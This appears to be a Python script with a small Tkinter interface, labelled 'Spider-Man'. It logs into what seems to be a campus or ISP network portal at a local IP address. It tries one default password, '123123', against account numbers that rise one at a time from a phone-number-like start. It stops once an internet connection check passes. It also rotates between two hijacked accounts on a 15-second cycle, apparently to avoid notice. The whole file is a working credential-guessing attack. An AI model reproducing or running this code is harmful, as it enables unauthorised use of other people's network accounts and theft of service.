import requests
import json
import urllib
import urllib.parse
import urllib.request
import http.cookiejar
import socket
import tkinter as tk
import threading
import time

def login(num):
    number = num
    # 定义请求header
    postData = {'id': '2000',
                'strAccount': number,
                'strPassword': '123123', }
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': 'http://192.168.255.195:8080/Control?id=1000',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Length': '49',
        'Host': '192.168.255.195:8080',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache', }
    # loginURL = 'http://192.168.255.195:8080'
    # cookie
    # cj = http.cookiejar.CookieJar()
    # opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    # urllib.request.install_opener(opener)
    # resp = urllib.request.urlopen(loginURL)
    # post访问
    postURL = 'http://192.168.255.195:8080/Control'
    postData = urllib.parse.urlencode(postData).encode('utf-8')
    request = urllib.request.Request(postURL, postData, headers)
    response = urllib.request.urlopen(request)
    # html = response.read().decode('gb2312')
    print('登陆')

def quit():
    url = "http://192.168.255.195:8080/Control?id=4000"
    req = urllib.request.Request(url)
    resp = urllib.request.urlopen(req)
    print("完成退出")

def isNetOK():
    testserver = ('www.baidu.com', 443)
    s = socket.socket()
    s.settimeout(0.05)
    try:
        status = s.connect_ex(testserver)
        if status == 0:
            s.close()
            return True
        else:
            return False
    except Exception as e:
        return False

def main():
    number = 19862171120
    while isNetOK() != True:
        login(number)
        number += 1
    print(number-1)
    print('登陆成功')
#不长时间占线
def Sure():
    number = 19862171120
    list = [19866121120,2]
    #thread1 = myThread(1, 1)
    #thread1.start()
    #thread1.join()
    while True:
        login(list[0])
        while isNetOK() != True:
            login(number)
            list[0] = number
            number += 1
        time.sleep(15)
        quit()
        login(list[1])
        while isNetOK() != True:
            login(number)
            list[1] = number
            number += 1
        time.sleep(15)
        quit()
#多线程
def thread_it(func,*args):
    # 创建
    t = threading.Thread(target=func, args=args)
    t.setDaemon(True)
    # 启动
    t.start()

class App:
    def __init__(self,root):
        frame = tk.Frame(root,height=100,width=300)
        root.title("蜘蛛侠")
        frame.pack()
        self.Btn = tk.Button(frame, text="智能联网", height=2, width=6, bg="green", fg="red", command=lambda :thread_it(Sure))
        self.Btn1 = tk.Button(frame, text="登陆上线", height=2, width=6,bg="green",fg="red", command=main)
        self.Btn2 = tk.Button(frame, text="下线退出",height=2, width=6, bg="lightblue", command=quit)
        self.Btn.pack()
        self.Btn1.pack()
        self.Btn2.pack()
if __name__ == '__main__':
    root = tk.Tk()
    app = App(root)
    root.mainloop()

